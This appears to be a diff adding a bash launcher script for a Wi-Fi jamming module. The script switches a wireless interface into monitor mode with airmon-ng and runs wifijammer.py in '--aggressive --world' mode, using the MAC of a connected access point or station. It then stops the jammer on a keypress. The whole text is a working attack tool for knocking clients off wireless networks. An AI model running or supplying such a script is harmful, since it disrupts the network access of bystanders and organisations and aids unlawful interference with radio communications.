@@ -1,0 +1,25 @@
+#!/bin/bash
+
+cd /opt/modules/wifijammer
+
+mac=$(nmcli dev wifi | grep '*' | awk '{print $2}')
+iface=$(nmcli dev  | grep wlan | grep -v p2p | grep disconnected | awk '{print $1}')
+sta=$(cat /sys/class/net/$(ls /sys/class/net | grep wlan | grep -v $iface)/address)
+
+airmon-ng start $iface 2&>/dev/null
+if [[ -n $(ifconfig | grep "$iface"mon) ]]; then moniface=$(echo "$iface"mon); else moniface="$iface"; fi
+
+
+
+if test "$1" = "ap"; then
+   python3 wifijammer.py -i $moniface -f $mac --aggressive --world &
+else
+   python3 wifijammer.py -i $moniface -f $sta --aggressive --world &
+fi
+
+jampid=$!
+read -p " " pause
+kill $jampid
+wait $jampid
+
+airmon-ng stop $moniface 2&>/dev/null
